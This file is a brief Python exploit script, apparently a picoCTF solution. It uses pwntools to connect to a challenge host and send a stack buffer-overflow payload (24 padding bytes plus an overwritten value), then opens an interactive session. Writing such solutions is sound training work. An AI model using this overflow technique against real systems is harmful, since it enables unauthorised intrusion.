from pwn import *

context.bits = 64

p = remote("saturn.picoctf.net", 62901)

payload = b"A"*24
payload += p32(0x41)

p.sendline(payload)
p.interactive()
